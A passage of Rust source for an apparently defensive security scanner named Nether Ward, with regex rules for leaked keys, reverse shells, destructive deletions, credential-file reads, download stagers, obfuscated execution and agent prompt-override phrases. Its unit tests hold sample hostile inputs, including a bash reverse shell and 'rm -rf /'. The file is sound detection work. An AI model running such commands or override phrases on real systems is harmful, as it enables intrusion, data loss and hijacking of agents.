use base64::prelude::*;
use colored::*;
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::{Path, PathBuf};

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum RuleCategory {
    SecretLeak,
    DangerousCode,
    ModelDeserialization,
    SystemExecution,
    Injection,
    AgentAgency,
    ObfuscationEvasion,
}

impl std::fmt::Display for RuleCategory {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            RuleCategory::SecretLeak => write!(f, "SECRET_LEAK"),
            RuleCategory::DangerousCode => write!(f, "DANGEROUS_CODE"),
            RuleCategory::ModelDeserialization => write!(f, "MODEL_DESERIALIZATION"),
            RuleCategory::SystemExecution => write!(f, "SYSTEM_EXECUTION"),
            RuleCategory::Injection => write!(f, "INJECTION_TRAVERSAL"),
            RuleCategory::AgentAgency => write!(f, "EXCESSIVE_AGENCY"),
            RuleCategory::ObfuscationEvasion => write!(f, "OBFUSCATION_EVASION"),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum SastSeverity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

impl std::fmt::Display for SastSeverity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            SastSeverity::Info => write!(f, "INFO"),
            SastSeverity::Low => write!(f, "LOW"),
            SastSeverity::Medium => write!(f, "MEDIUM"),
            SastSeverity::High => write!(f, "HIGH"),
            SastSeverity::Critical => write!(f, "CRITICAL"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SastRule {
    pub id: String,
    pub title: String,
    pub category: RuleCategory,
    pub severity: SastSeverity,
    pub pattern: String,
    pub recommendation: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VulnerabilityFinding {
    pub rule_id: String,
    pub title: String,
    pub category: RuleCategory,
    pub severity: SastSeverity,
    pub file_path: Option<String>,
    pub line_number: Option<usize>,
    pub matched_snippet: String,
    pub recommendation: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SastReport {
    pub total_files_scanned: usize,
    pub total_findings: usize,
    pub critical_count: usize,
    pub high_count: usize,
    pub medium_count: usize,
    pub low_count: usize,
    pub info_count: usize,
    pub duration_ms: u128,
    pub findings: Vec<VulnerabilityFinding>,
}

/// Active static analysis and threat rule definitions
pub fn get_default_rules() -> Vec<SastRule> {
    vec![
        // 1. Secrets & Credentials
        SastRule {
            id: "NW-SEC-001".to_string(),
            title: "AWS Access Key ID Detected".to_string(),
            category: RuleCategory::SecretLeak,
            severity: SastSeverity::Critical,
            pattern: r"(?:AKIA[0-9A-Z]{16})".to_string(),
            recommendation: "Rotate compromised AWS credentials and transition to IAM Roles or Secrets Manager.".to_string(),
        },
        SastRule {
            id: "NW-SEC-002".to_string(),
            title: "OpenAI / Claude API Secret Key Detected".to_string(),
            category: RuleCategory::SecretLeak,
            severity: SastSeverity::Critical,
            pattern: r"(?:sk-(?:proj-|ant-)?[a-zA-Z0-9_-]{20,})".to_string(),
            recommendation: "Revoke exposed API key immediately and inject via environment variables or secret vaults.".to_string(),
        },
        SastRule {
            id: "NW-SEC-003".to_string(),
            title: "Google Cloud / Gemini API Key Detected".to_string(),
            category: RuleCategory::SecretLeak,
            severity: SastSeverity::Critical,
            pattern: r"(?:AIza[0-9A-Za-z\-_]{35})".to_string(),
            recommendation: "Revoke API key in Google Cloud Console and apply API restriction policies.".to_string(),
        },
        SastRule {
            id: "NW-SEC-004".to_string(),
            title: "GitHub Personal Access Token Detected".to_string(),
            category: RuleCategory::SecretLeak,
            severity: SastSeverity::Critical,
            pattern: r"(?:gh[pousr]_[a-zA-Z0-9]{36,})".to_string(),
            recommendation: "Revoke GitHub PAT from account settings and verify audit log for unauthorized access.".to_string(),
        },
        SastRule {
            id: "NW-SEC-005".to_string(),
            title: "Slack API Bot or User Token Detected".to_string(),
            category: RuleCategory::SecretLeak,
            severity: SastSeverity::High,
            pattern: r"(?:xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24,32})".to_string(),
            recommendation: "Revoke Slack token in Slack App Management and rotate app credentials.".to_string(),
        },
        SastRule {
            id: "NW-SEC-006".to_string(),
            title: "Private Cryptographic Key Header Detected".to_string(),
            category: RuleCategory::SecretLeak,
            severity: SastSeverity::Critical,
            pattern: r"(?:-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----)".to_string(),
            recommendation: "Store private keys in hardware security modules (HSM) or encrypted secret vaults.".to_string(),
        },

        // 2. Dangerous Code Execution & Dynamic Evaluation
        SastRule {
            id: "NW-CODE-001".to_string(),
            title: "Dynamic Code Evaluation Invocations (eval/exec)".to_string(),
            category: RuleCategory::DangerousCode,
            severity: SastSeverity::High,
            pattern: r"(?:\b(eval|exec)\s*\([^)]+\))".to_string(),
            recommendation: "Eliminate dynamic code evaluation; replace with structured parsers (e.g. JSON/AST).".to_string(),
        },
        SastRule {
            id: "NW-CODE-002".to_string(),
            title: "Unsafe Python OS System Execution".to_string(),
            category: RuleCategory::DangerousCode,
            severity: SastSeverity::High,
            pattern: r"(?:\bos\.system\s*\()".to_string(),
            recommendation: "Replace os.system with subprocess.run using argument vectors (shell=False).".to_string(),
        },
        SastRule {
            id: "NW-CODE-003".to_string(),
            title: "Python Subprocess with Shell Mode Enabled".to_string(),
            category: RuleCategory::DangerousCode,
            severity: SastSeverity::High,
            pattern: r"(?:\bsubprocess\.(?:Popen|call|run|check_output)\s*\([^)]*shell\s*=\s*True)".to_string(),
            recommendation: "Disable shell=True to prevent arbitrary command injection via shell metacharacters.".to_string(),
        },
        SastRule {
            id: "NW-CODE-004".to_string(),
            title: "Node.js Unsafe Child Process Execution".to_string(),
            category: RuleCategory::DangerousCode,
            severity: SastSeverity::High,
            pattern: r"(?:\bchild_process\.(?:exec|execSync)\s*\()".to_string(),
            recommendation: "Use child_process.execFile or spawn with argument arrays without shell interpolation.".to_string(),
        },

        // 3. AI / Machine Learning Deserialization Exploits
        SastRule {
            id: "NW-ML-001".to_string(),
            title: "Arbitrary Code Execution via Insecure Python Pickle Loading".to_string(),
            category: RuleCategory::ModelDeserialization,
            severity: SastSeverity::Critical,
            pattern: r"(?:\bpickle\.(?:loads?|Unpickler)\s*\()".to_string(),
            recommendation: "Replace pickle serialization with safe formats such as Safetensors, JSON, or Arrow.".to_string(),
        },
        SastRule {
            id: "NW-ML-002".to_string(),
            title: "Pickle Bytecode RCE Reducer Indicator".to_string(),
            category: RuleCategory::ModelDeserialization,
            severity: SastSeverity::Critical,
            pattern: r"(?:cposix\s*\nsystem|c__builtin__\s*\nexec|__reduce__)".to_string(),
            recommendation: "Quarantine model checkpoint; detected bytecode attempts arbitrary shell execution on load.".to_string(),
        },
        SastRule {
            id: "NW-ML-003".to_string(),
            title: "Unsafe PyTorch Weights Loading without Safetensors".to_string(),
            category: RuleCategory::ModelDeserialization,
            severity: SastSeverity::Medium,
            pattern: r"(?:\btorch\.load\s*\([^)]*weights_only\s*=\s*False)".to_string(),
            recommendation: "Enforce torch.load(..., weights_only=True) or convert weights to Safetensors format.".to_string(),
        },
        SastRule {
            id: "NW-ML-004".to_string(),
            title: "Insecure NumPy Pickle Deserialization".to_string(),
            category: RuleCategory::ModelDeserialization,
            severity: SastSeverity::High,
            pattern: r"(?:\bnp\.load\s*\([^)]*allow_pickle\s*=\s*True)".to_string(),
            recommendation: "Disable allow_pickle=True in np.load to mitigate arbitrary object deserialization.".to_string(),
        },

        // 4. System Execution & Reverse Shell Backdoors
        SastRule {
            id: "NW-SYS-001".to_string(),
            title: "Interactive Bash Reverse Shell Redirection".to_string(),
            category: RuleCategory::SystemExecution,
            severity: SastSeverity::Critical,
            pattern: r"(?:/dev/tcp/[0-9a-zA-Z._-]+/[0-9]+|sh\s+-i\s+>&|bash\s+-i\s+>&)".to_string(),
            recommendation: "Isolate host environment immediately and audit network socket creation.".to_string(),
        },
        SastRule {
            id: "NW-SYS-002".to_string(),
            title: "Destructive Recursive Filesystem Command".to_string(),
            category: RuleCategory::SystemExecution,
            severity: SastSeverity::Critical,
            pattern: r"(?:rm\s+-(?:rf|fr)\s+(?:/|/\*|/var|/etc|~))".to_string(),
            recommendation: "Block unconfirmed destructive filesystem deletions at the execution boundary.".to_string(),
        },
        SastRule {
            id: "NW-SYS-003".to_string(),
            title: "Sensitive Credential File Reconnaissance".to_string(),
            category: RuleCategory::SystemExecution,
            severity: SastSeverity::High,
            pattern: r"(?:cat\s+/etc/(?:shadow|passwd)|cat\s+~?/\.ssh/id_[a-zA-Z0-9_-]+)".to_string(),
            recommendation: "Restrict local file read permissions and confine process capabilities.".to_string(),
        },
        SastRule {
            id: "NW-SYS-004".to_string(),
            title: "In-Memory PowerShell Web Download Stager".to_string(),
            category: RuleCategory::SystemExecution,
            severity: SastSeverity::High,
            pattern: r"(?:IEX\s*\(\s*(?:New-Object\s+Net\.WebClient|iwr)|Invoke-Expression.*DownloadString)".to_string(),
            recommendation: "Enforce PowerShell Constrained Language Mode and Application Whitelisting.".to_string(),
        },

        // 5. Injection & Traversal Vectors
        SastRule {
            id: "NW-INJ-001".to_string(),
            title: "Directory Path Traversal Sequence".to_string(),
            category: RuleCategory::Injection,
            severity: SastSeverity::High,
            pattern: r"(?:(?:\.\./){2,}|\.\.\\\.\.\\)".to_string(),
            recommendation: "Sanitize user paths with canonicalization and enforce root directory sandboxing.".to_string(),
        },
        SastRule {
            id: "NW-INJ-002".to_string(),
            title: "SQL Injection Probe Syntax in Parameters".to_string(),
            category: RuleCategory::Injection,
            severity: SastSeverity::High,
            pattern: r"(?:'\s*OR\s*'1'='1|UNION\s+SELECT|;\s*DROP\s+TABLE)".to_string(),
            recommendation: "Use parameterized prepared statements exclusively; avoid string concatenation in SQL queries.".to_string(),
        },

        // 6. Semantic Obfuscation & Evasion Vectors
        SastRule {
            id: "NW-OBF-001".to_string(),
            title: "Obfuscated Dynamic Execution via Reflection".to_string(),
            category: RuleCategory::ObfuscationEvasion,
            severity: SastSeverity::Critical,
            pattern: r#"(?:getattr\s*\(\s*(?:__import__\s*\(|importlib|os|sys)|__import__\s*\(\s*['"](?:os|subprocess|sys|socket|pty|shutil)['"]|importlib\.import_module\s*\(\s*['"](?:os|subprocess|sys|socket|pty)['"])"#.to_string(),
            recommendation: "Prohibit dynamic module reflection and indirect imports in autonomous agent code.".to_string(),
        },
        SastRule {
            id: "NW-OBF-002".to_string(),
            title: "Encoded Payload Dynamic Execution (Base64 / Hex Decode into Eval/Exec)".to_string(),
            category: RuleCategory::ObfuscationEvasion,
            severity: SastSeverity::Critical,
            pattern: r#"(?:(?:exec|eval)\s*\(\s*(?:[a-zA-Z0-9_.]+\.)?(?:b64decode|decodebytes|fromhex|unhexlify)|(?:atob|Buffer\.from)\s*\([^)]+\)\s*(?:\.toString\(\))?\s*\|>\s*eval|eval\s*\(\s*atob\s*\()"#.to_string(),
            recommendation: "Block dynamic decoding and execution of in-memory byte payloads.".to_string(),
        },
        SastRule {
            id: "NW-OBF-003".to_string(),
            title: "String Concatenation Evasion in Dangerous Execution Sink".to_string(),
            category: RuleCategory::ObfuscationEvasion,
            severity: SastSeverity::High,
            pattern: r#"(?:['"](?:os\.?|subproc|sys)[\s'"]*\+[\s'"]*(?:system|tem|ess|stem)|['"]ev[\s'"]*\+[\s'"]*al['"]|getattr\s*\([^,]+,\s*['"][a-zA-Z0-9_]+['"]\s*\+\s*['"][a-zA-Z0-9_]+['"]\))"#.to_string(),
            recommendation: "Eliminate string concatenation used to disguise execution function symbols.".to_string(),
        },
        SastRule {
            id: "NW-OBF-004".to_string(),
            title: "Embedded Base64 Encoded Executable / Shellcode Stager".to_string(),
            category: RuleCategory::ObfuscationEvasion,
            severity: SastSeverity::Critical,
            pattern: r#"(?:(?:b64decode|decodebytes)\s*\(\s*['"][A-Za-z0-9+/=]{24,}['"])"#.to_string(),
            recommendation: "Inspect decoded payload; embedded encoded binary or script exceeds security threshold.".to_string(),
        },

        // 7. Next-Gen Autonomous Agent Honeypots, Operational Velocity & Dual-Key Gates
        SastRule {
            id: "NW-CANARY-001".to_string(),
            title: "In-Context Canary Token Compromise Detected".to_string(),
            category: RuleCategory::SecretLeak,
            severity: SastSeverity::Critical,
            pattern: r"(?:AKIA_CANARY_[A-Z0-9]{16}|nw_canary_[a-zA-Z0-9_-]{16,})".to_string(),
            recommendation: "Halt agent execution immediately. Synthetic decoy credential leaked in prompt, tool call, or outbound traffic.".to_string(),
        },
        SastRule {
            id: "NW-CANARY-002".to_string(),
            title: "In-Context Honeypot File Access Attempt".to_string(),
            category: RuleCategory::DangerousCode,
            severity: SastSeverity::Critical,
            pattern: r"(?:[./\\]*\.nether_canary[a-zA-Z0-9_.-]*)".to_string(),
            recommendation: "Block tool execution. Autonomous agent navigated to or attempted access to a designated canary honeypot path.".to_string(),
        },
        SastRule {
            id: "NW-VEL-001".to_string(),
            title: "Autonomous Agent Operational Velocity Exceeded".to_string(),
            category: RuleCategory::AgentAgency,
            severity: SastSeverity::High,
            pattern: r"(?:\b(?:while\s+true|loop\s*\{|for\s*\(\s*;\s*;\s*\))\s*\{[^}]*(?:curl|fetch|exec|system))".to_string(),
            recommendation: "Throttle autonomous agent execution. Unbounded execution loops or burst rate limits exceeded.".to_string(),
        },
        SastRule {
            id: "NW-GATE-001".to_string(),
            title: "Dual-Key Authorization Gate Triggered (Irreversible Operation)".to_string(),
            category: RuleCategory::SystemExecution,
            severity: SastSeverity::Critical,
            pattern: r"(?:rm\s+-(?:rf|fr)\s+[/~]|chmod\s+(?:-R\s+)?(?:777|a\+rwx)|mkfs\.[a-z0-9]+\s+/dev/|dd\s+if=/dev/)".to_string(),
            recommendation: "Halt execution pending operator verification. Command is classified as irreversible/destructive. Dual-key cryptographic confirmation required.".to_string(),
        },
        SastRule {
            id: "NW-CTX-001".to_string(),
            title: "Indirect Goal Hijacking via Unquarantined Context".to_string(),
            category: RuleCategory::AgentAgency,
            severity: SastSeverity::Critical,
            pattern: r#"(?:(?i)ignore\s+all\s+(?:previous|prior)\s+instructions|system\s+override\s+code\s*[:=])"#.to_string(),
            recommendation: "Reject payload. External untrusted text contains directive override syntax attempting to subvert agent goal alignment.".to_string(),
        },
    ]
}

/// Redact sensitive substrings (e.g. API keys) for safe terminal and report printing
pub fn redact_secret(s: &str) -> String {
    if s.len() <= 8 {
        return "***REDACTED***".to_string();
    }
    let prefix = &s[..4];
    let suffix = &s[s.len() - 4..];
    format!("{prefix}***REDACTED***{suffix}")
}

/// Sanitize text in-flight by replacing all detected secret leaks with redacted placeholders
pub fn sanitize_secrets(content: &str) -> (String, usize) {
    let rules = get_default_rules();
    let secret_rules: Vec<_> = rules
        .into_iter()
        .filter(|r| r.category == RuleCategory::SecretLeak)
        .collect();
    let mut sanitized = content.to_string();
    let mut redactions_count = 0;

    for rule in &secret_rules {
        if let Ok(re) = Regex::new(&rule.pattern) {
            sanitized = re
                .replace_all(&sanitized, |caps: &regex::Captures| {
                    redactions_count += 1;
                    let matched = caps.get(0).map(|m| m.as_str()).unwrap_or("");
                    redact_secret(matched)
                })
                .to_string();
        }
    }

    (sanitized, redactions_count)
}

/// Helper to determine if a source line is a pure comment
fn is_comment_line(line: &str) -> bool {
    let t = line.trim();
    t.starts_with("//")
        || t.starts_with('#')
        || t.starts_with("/*")
        || t.starts_with('*')
        || t.starts_with("<!--")
}

/// Deep inspection of base64 string literals to detect encoded stagers and shellcode
pub fn scan_decoded_base64_payloads(
    content: &str,
    file_name: Option<&str>,
) -> Vec<VulnerabilityFinding> {
    let mut findings = Vec::new();
    let b64_re = match Regex::new(r#"(?:'|")([A-Za-z0-9+/]{28,}={0,2})(?:'|")"#) {
        Ok(re) => re,
        Err(_) => return findings,
    };

    let suspicious_indicators = [
        "/bin/sh",
        "/bin/bash",
        "/dev/tcp/",
        "nc -e",
        "os.system",
        "subprocess.Popen",
        "rm -rf",
        "Invoke-Expression",
        "powershell",
        "eval(",
        "exec(",
        "wget ",
        "curl ",
        "cat /etc/shadow",
    ];

    for (line_idx, line) in content.lines().enumerate() {
        for caps in b64_re.captures_iter(line) {
            if let Some(mat) = caps.get(1) {
                let candidate = mat.as_str();
                if let Ok(decoded_bytes) = BASE64_STANDARD.decode(candidate) {
                    if let Ok(decoded_str) = String::from_utf8(decoded_bytes) {
                        for indicator in suspicious_indicators {
                            if decoded_str.contains(indicator) {
                                findings.push(VulnerabilityFinding {
                                    rule_id: "NW-OBF-004".to_string(),
                                    title: "Embedded Base64 Encoded Executable / Shellcode Stager".to_string(),
                                    category: RuleCategory::ObfuscationEvasion,
                                    severity: SastSeverity::Critical,
                                    file_path: file_name.map(|s| s.to_string()),
                                    line_number: Some(line_idx + 1),
                                    matched_snippet: format!("base64 payload decodes to suspicious sink: '{}'", indicator),
                                    recommendation: "Quarantine decoded payload; base64 string disguises unauthorized command execution.".to_string(),
                                });
                                break;
                            }
                        }
                    }
                }
            }
        }
    }

    findings
}

/// Scan string content against all active SAST rules
pub fn scan_content(content: &str, file_name: Option<&str>) -> Vec<VulnerabilityFinding> {
    let rules = get_default_rules();
    let mut findings = Vec::new();

    for rule in &rules {
        if let Ok(re) = Regex::new(&rule.pattern) {
            for (line_idx, line) in content.lines().enumerate() {
                let trimmed = line.trim();
                // Skip rule registry self-definitions
                if trimmed.starts_with("pattern:")
                    || trimmed.starts_with("title:")
                    || trimmed.starts_with("recommendation:")
                    || trimmed.starts_with("SastRule {")
                {
                    continue;
                }

                // Suppress comment false-positives for dangerous code and obfuscation patterns (secrets are still reported)
                if is_comment_line(line)
                    && (rule.category == RuleCategory::DangerousCode
                        || rule.category == RuleCategory::ObfuscationEvasion)
                {
                    continue;
                }

                if let Some(mat) = re.find(line) {
                    let matched_raw = mat.as_str();
                    let snippet = if rule.category == RuleCategory::SecretLeak {
                        redact_secret(matched_raw)
                    } else {
                        matched_raw.chars().take(80).collect::<String>()
                    };

                    findings.push(VulnerabilityFinding {
                        rule_id: rule.id.clone(),
                        title: rule.title.clone(),
                        category: rule.category.clone(),
                        severity: rule.severity.clone(),
                        file_path: file_name.map(|s| s.to_string()),
                        line_number: Some(line_idx + 1),
                        matched_snippet: snippet,
                        recommendation: rule.recommendation.clone(),
                    });
                }
            }
        }
    }

    // Run deep payload de-obfuscation
    let b64_findings = scan_decoded_base64_payloads(content, file_name);
    findings.extend(b64_findings);

    findings
}

/// Scan a single file path for security vulnerabilities
pub fn scan_file(path: &Path) -> std::io::Result<Vec<VulnerabilityFinding>> {
    let content = fs::read_to_string(path)?;
    Ok(scan_content(&content, path.to_str()))
}

/// Recursively scan a target directory for security vulnerabilities and dangerous patterns
pub fn scan_directory(dir_path: &Path) -> std::io::Result<SastReport> {
    let start = std::time::Instant::now();
    let mut files = Vec::new();
    collect_source_files(dir_path, &mut files)?;

    let mut all_findings = Vec::new();
    let mut critical_count = 0;
    let mut high_count = 0;
    let mut medium_count = 0;
    let mut low_count = 0;
    let mut info_count = 0;

    for file in &files {
        if let Ok(content) = fs::read_to_string(file) {
            let rel_path = file
                .strip_prefix(dir_path)
                .unwrap_or(file)
                .to_string_lossy()
                .to_string();

            let findings = scan_content(&content, Some(&rel_path));
            for f in findings {
                match f.severity {
                    SastSeverity::Critical => critical_count += 1,
                    SastSeverity::High => high_count += 1,
                    SastSeverity::Medium => medium_count += 1,
                    SastSeverity::Low => low_count += 1,
                    SastSeverity::Info => info_count += 1,
                }
                all_findings.push(f);
            }
        }
    }

    Ok(SastReport {
        total_files_scanned: files.len(),
        total_findings: all_findings.len(),
        critical_count,
        high_count,
        medium_count,
        low_count,
        info_count,
        duration_ms: start.elapsed().as_millis(),
        findings: all_findings,
    })
}

fn collect_source_files(dir: &Path, files: &mut Vec<PathBuf>) -> std::io::Result<()> {
    if !dir.is_dir() {
        return Ok(());
    }

    let skip_dirs = [
        ".git",
        "target",
        "node_modules",
        "result",
        ".direnv",
        ".cache",
    ];

    for entry in fs::read_dir(dir)? {
        let entry = entry?;
        let path = entry.path();
        if path.is_dir() {
            let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
            if !skip_dirs.contains(&name) {
                collect_source_files(&path, files)?;
            }
        } else if path.is_file() {
            // Check relevant source or config extensions
            let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
            let allowed_exts = [
                "rs", "py", "js", "ts", "sh", "bash", "ps1", "json", "yaml", "yml", "env", "toml",
                "txt", "md", "sql", "bin",
            ];
            if allowed_exts.contains(&ext)
                || path.file_name().and_then(|n| n.to_str()) == Some(".env")
            {
                files.push(path);
            }
        }
    }
    Ok(())
}

pub fn print_sast_report(report: &SastReport, target: &str) {
    println!();
    println!(
        "{}",
        "================================================================================".blue()
    );
    println!(
        "{}",
        "          NETHER WARD: STATIC APPLICATION SECURITY TESTING (SAST)               "
            .bold()
            .cyan()
    );
    println!(
        "{}",
        "================================================================================".blue()
    );
    println!("{:<24}: {}", "Scan Target".bold(), target);
    println!(
        "{:<24}: {} files",
        "Files Scanned".bold(),
        report.total_files_scanned
    );
    println!(
        "{:<24}: {} findings",
        "Total Vulnerabilities".bold(),
        if report.total_findings > 0 {
            report.total_findings.to_string().red().bold()
        } else {
            "0".green().bold()
        }
    );
    println!(
        "{:<24}: {} ms",
        "Analysis Latency".bold(),
        report.duration_ms
    );
    println!();
    println!("{}", "--- SEVERITY BREAKDOWN ---".bold());
    println!(
        "{:<24}: {}",
        "Critical Findings".bold(),
        if report.critical_count > 0 {
            report.critical_count.to_string().white().on_red().bold()
        } else {
            "0".green()
        }
    );
    println!(
        "{:<24}: {}",
        "High Severity".bold(),
        if report.high_count > 0 {
            report.high_count.to_string().red().bold()
        } else {
            "0".green()
        }
    );
    println!(
        "{:<24}: {}",
        "Medium Severity".bold(),
        if report.medium_count > 0 {
            report.medium_count.to_string().yellow().bold()
        } else {
            "0".green()
        }
    );
    println!(
        "{:<24}: {}",
        "Low Severity".bold(),
        report.low_count.to_string().cyan()
    );
    println!();

    if !report.findings.is_empty() {
        println!(
            "{:<12} {:<10} {:<30} {:<24}",
            "RULE ID", "SEVERITY", "TITLE", "LOCATION"
        );
        println!(
            "{}",
            "--------------------------------------------------------------------------------"
                .blue()
        );

        for f in &report.findings {
            let sev_str = match f.severity {
                SastSeverity::Critical => "CRITICAL".white().on_red().bold(),
                SastSeverity::High => "HIGH".red().bold(),
                SastSeverity::Medium => "MEDIUM".yellow(),
                SastSeverity::Low => "LOW".cyan(),
                SastSeverity::Info => "INFO".normal(),
            };

            let loc = match (&f.file_path, f.line_number) {
                (Some(path), Some(line)) => format!("{path}:{line}"),
                (Some(path), None) => path.clone(),
                (None, _) => "memory".to_string(),
            };

            let title_trunc = if f.title.len() > 30 {
                format!("{}...", &f.title[..27])
            } else {
                f.title.clone()
            };

            println!(
                "{:<12} {:<10} {:<30} {:<24}",
                f.rule_id.cyan(),
                sev_str,
                title_trunc,
                loc.yellow()
            );
            println!("  Snippet: {}", f.matched_snippet.dimmed());
            println!("  Fix:     {}", f.recommendation.dimmed());
            println!();
        }
    }

    println!(
        "{}",
        "================================================================================".blue()
    );
    println!();
}

pub fn print_rules() {
    let rules = get_default_rules();
    println!();
    println!(
        "{}",
        "================================================================================".blue()
    );
    println!(
        "{}",
        "             NETHER WARD: ACTIVE SAST & SECURITY RULE REGISTRY                 "
            .bold()
            .cyan()
    );
    println!(
        "{}",
        "================================================================================".blue()
    );
    println!(
        "{:<14} {:<12} {:<22} {:<32}",
        "RULE ID", "SEVERITY", "CATEGORY", "TITLE"
    );
    println!(
        "{}",
        "--------------------------------------------------------------------------------".blue()
    );
    for r in &rules {
        let sev_str = match r.severity {
            SastSeverity::Critical => "CRITICAL".red().bold(),
            SastSeverity::High => "HIGH".red(),
            SastSeverity::Medium => "MEDIUM".yellow(),
            SastSeverity::Low => "LOW".cyan(),
            SastSeverity::Info => "INFO".normal(),
        };
        println!(
            "{:<14} {:<12} {:<22} {:<32}",
            r.id.cyan(),
            sev_str,
            r.category.to_string(),
            r.title
        );
    }
    println!(
        "{}",
        "================================================================================".blue()
    );
    println!();
}

pub fn export_sarif(report: &SastReport, output_path: &Path) -> std::io::Result<()> {
    let rules = get_default_rules();
    let sarif_rules: Vec<serde_json::Value> = rules
        .into_iter()
        .map(|r| {
            let default_level = match r.severity {
                SastSeverity::Critical | SastSeverity::High => "error",
                SastSeverity::Medium => "warning",
                SastSeverity::Low | SastSeverity::Info => "note",
            };
            serde_json::json!({
                "id": r.id,
                "name": r.title,
                "shortDescription": { "text": r.title },
                "fullDescription": { "text": format!("{} [{}]", r.title, r.category) },
                "help": { "text": r.recommendation },
                "defaultConfiguration": { "level": default_level }
            })
        })
        .collect();

    let sarif_results: Vec<serde_json::Value> = report
        .findings
        .iter()
        .map(|f| {
            let level = match f.severity {
                SastSeverity::Critical | SastSeverity::High => "error",
                SastSeverity::Medium => "warning",
                SastSeverity::Low | SastSeverity::Info => "note",
            };

            let loc = f.file_path.as_deref().unwrap_or("unknown");
            let line = f.line_number.unwrap_or(1);

            serde_json::json!({
                "ruleId": f.rule_id,
                "level": level,
                "message": {
                    "text": format!("{}: {} (Matched: {})", f.title, f.recommendation, f.matched_snippet)
                },
                "locations": [
                    {
                        "physicalLocation": {
                            "artifactLocation": {
                                "uri": loc,
                                "uriBaseId": "%SRCROOT%"
                            },
                            "region": {
                                "startLine": line,
                                "startColumn": 1
                            }
                        }
                    }
                ]
            })
        })
        .collect();

    let sarif_doc = serde_json::json!({
        "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
        "version": "2.1.0",
        "runs": [
            {
                "tool": {
                    "driver": {
                        "name": "Nether Ward",
                        "version": "0.2.0",
                        "informationUri": "https://github.com/shanmukha-sai-chinnam/nether-ward",
                        "rules": sarif_rules
                    }
                },
                "results": sarif_results
            }
        ]
    });

    if let Some(parent) = output_path.parent() {
        fs::create_dir_all(parent)?;
    }
    fs::write(output_path, serde_json::to_string_pretty(&sarif_doc)?)?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_export_sarif() {
        let findings = vec![VulnerabilityFinding {
            rule_id: "NW-SEC-001".to_string(),
            title: "AWS Access Key ID Detected".to_string(),
            category: RuleCategory::SecretLeak,
            severity: SastSeverity::Critical,
            file_path: Some("config/credentials.env".to_string()),
            line_number: Some(2),
            matched_snippet: "AKIA***REDACTED***MPLE".to_string(),
            recommendation: "Rotate compromised AWS credentials.".to_string(),
        }];

        let report = SastReport {
            total_files_scanned: 1,
            total_findings: 1,
            critical_count: 1,
            high_count: 0,
            medium_count: 0,
            low_count: 0,
            info_count: 0,
            duration_ms: 10,
            findings,
        };

        let temp_path = std::env::temp_dir().join("test_sast.sarif");
        let res = export_sarif(&report, &temp_path);
        assert!(res.is_ok());

        let content = fs::read_to_string(&temp_path).unwrap();
        assert!(content.contains("https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json"));
        assert!(content.contains("NW-SEC-001"));
        assert!(content.contains("config/credentials.env"));
        let _ = fs::remove_file(temp_path);
    }

    #[test]
    fn test_aws_key_detection() {
        let sample = "const AWS_KEY = \"AKIAIOSFODNN7EXAMPLE\";";
        let findings = scan_content(sample, Some("aws.ts"));
        assert!(findings.iter().any(|f| f.rule_id == "NW-SEC-001"));
        assert!(findings
            .iter()
            .any(|f| f.severity == SastSeverity::Critical));
        assert!(findings[0].matched_snippet.contains("***REDACTED***"));
    }

    #[test]
    fn test_python_eval_os_system_detection() {
        let sample = "import os\nos.system('rm -rf /')\neval(user_payload)\n";
        let findings = scan_content(sample, Some("tools.py"));
        assert!(findings.iter().any(|f| f.rule_id == "NW-CODE-001"));
        assert!(findings.iter().any(|f| f.rule_id == "NW-CODE-002"));
    }

    #[test]
    fn test_pickle_deserialization_detection() {
        let sample = "import pickle\nobj = pickle.loads(untrusted_bytes)\n";
        let findings = scan_content(sample, Some("model.py"));
        assert!(findings.iter().any(|f| f.rule_id == "NW-ML-001"));
        assert_eq!(findings[0].severity, SastSeverity::Critical);
    }

    #[test]
    fn test_reverse_shell_detection() {
        let sample = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
        let findings = scan_content(sample, Some("payload.sh"));
        assert!(findings.iter().any(|f| f.rule_id == "NW-SYS-001"));
    }

    #[test]
    fn test_clean_file_no_findings() {
        let sample = "fn calculate_sum(a: i32, b: i32) -> i32 { a + b }\n";
        let findings = scan_content(sample, Some("math.rs"));
        assert!(findings.is_empty());
    }

    #[test]
    fn test_sql_injection_detection() {
        let sample = "let query = format!(\"SELECT * FROM users WHERE id = '{}'\", user_id);\n// ' OR '1'='1\n";
        let findings = scan_content(sample, Some("db.rs"));
        assert!(findings.iter().any(|f| f.rule_id == "NW-INJ-002"));
    }

    #[test]
    fn test_sanitize_secrets() {
        let text = "My token is AKIAIOSFODNN7EXAMPLE and secret is safe.";
        let (sanitized, count) = sanitize_secrets(text);
        assert_eq!(count, 1);
        assert!(!sanitized.contains("AKIAIOSFODNN7EXAMPLE"));
        assert!(sanitized.contains("AKIA***REDACTED***MPLE"));
    }

    #[test]
    fn test_obfuscation_reflection_detection() {
        let sample = "func = getattr(__import__('os'), 'system')\nfunc('whoami')\n";
        let findings = scan_content(sample, Some("evasion.py"));
        assert!(findings.iter().any(|f| f.rule_id == "NW-OBF-001"));
        assert_eq!(findings[0].severity, SastSeverity::Critical);
    }

    #[test]
    fn test_obfuscation_encoded_eval_detection() {
        let sample = "import base64\nexec(base64.b64decode(payload))\n";
        let findings = scan_content(sample, Some("loader.py"));
